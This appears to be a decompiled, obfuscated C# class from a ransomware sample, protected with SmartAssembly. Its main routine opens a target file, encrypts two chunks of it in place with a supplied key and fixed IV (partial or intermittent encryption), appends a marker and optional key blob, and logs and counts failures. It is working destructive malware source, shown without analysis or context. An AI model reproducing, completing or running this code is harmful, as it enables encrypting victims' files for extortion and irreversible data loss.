using System;
using System.IO;
using System.Text;
using QFyaHqhDqlrj;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace EJhaxGWLzpBbb;

internal sealed class fUfTmnKzHcpx
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int NgTmtJGxYKhPV(long long_0)
	{
		return (int)long_0;
	}

	public static void epfACCRTlqVGS(string qbqFeDuDJzFyqZdWBP, string ueurAVACmA, string amTsfHOKqG, byte[] hBEUbMSAVoTT = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(qbqFeDuDJzFyqZdWBP, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = NgTmtJGxYKhPV(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(ueurAVACmA) * Convert.ToInt32(fileStream.Length) / 100;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = int.MaxValue;
				}
				if (num < num2)
				{
					num2 = num - Convert.ToInt32(ueurAVACmA) * 1000 * 1000;
				}
				int ipahuEaPwRm = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 2; i++)
				{
					byte[] byte_ = AFUXLQKIkcXnuU(qbqFeDuDJzFyqZdWBP, fileStream, ipahuEaPwRm, num * i);
					array = (hiKoLLubGHH.qZXDIsTpDUXR ? lvPnQGmwQvcsCNgQ.RRycjAChOoCA(byte_, Encoding.ASCII.GetBytes(amTsfHOKqG), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : UMakmguwDziAz.YfzRuKIVSlIggFhc(byte_, Encoding.ASCII.GetBytes(amTsfHOKqG), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					lbtROthpkDBZxuQ(qbqFeDuDJzFyqZdWBP, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (hiKoLLubGHH.kzxgomJEqSw ? Encoding.ASCII.GetBytes(hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107195195)) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196179)) + Convert.ToString(ueurAVACmA) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196179))) : Encoding.ASCII.GetBytes(hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107195195)) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196220)) + Convert.ToString(ueurAVACmA) + hiKoLLubGHH.ZszvXPTYjBtgjF(getString_0(107196220))));
			if (!hiKoLLubGHH.kzxgomJEqSw)
			{
				using FileStream fileStream2 = new FileStream(qbqFeDuDJzFyqZdWBP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(qbqFeDuDJzFyqZdWBP, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(hBEUbMSAVoTT, 0, hBEUbMSAVoTT.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (hiKoLLubGHH.WUCUbinjeq)
			{
				try
				{
					File.AppendAllText(hiKoLLubGHH.YPtXSOBdFjEyjx, getString_0(107116908) + qbqFeDuDJzFyqZdWBP + getString_0(107195182) + ex.Message + getString_0(107396380));
				}
				catch (Exception)
				{
				}
			}
			hiKoLLubGHH.uKBVRzIpOhGoBvvo++;
		}
		hiKoLLubGHH.jTlplcaVkMbxzj++;
	}

	public static byte[] AFUXLQKIkcXnuU(string cxtCRPdaMbRu, FileStream SmPRfJLVUcaC, int ipahuEaPwRm, int QVSvXjEffSxkXY = 0)
	{
		byte[] array = new byte[ipahuEaPwRm];
		SmPRfJLVUcaC.Position = QVSvXjEffSxkXY;
		SmPRfJLVUcaC.Read(array, 0, ipahuEaPwRm);
		return array;
	}

	public static void lbtROthpkDBZxuQ(string PclWAGCeAEYcrPc, FileStream DYciqOrAyRbwKP, byte[] peSQdpjDJEwguG, int RanVZiIALbv = 0)
	{
		DYciqOrAyRbwKP.Position = RanVZiIALbv;
		DYciqOrAyRbwKP.Write(peSQdpjDJEwguG, 0, peSQdpjDJEwguG.Length);
	}

	static fUfTmnKzHcpx()
	{
		Strings.CreateGetStringDelegate(typeof(fUfTmnKzHcpx));
	}
}
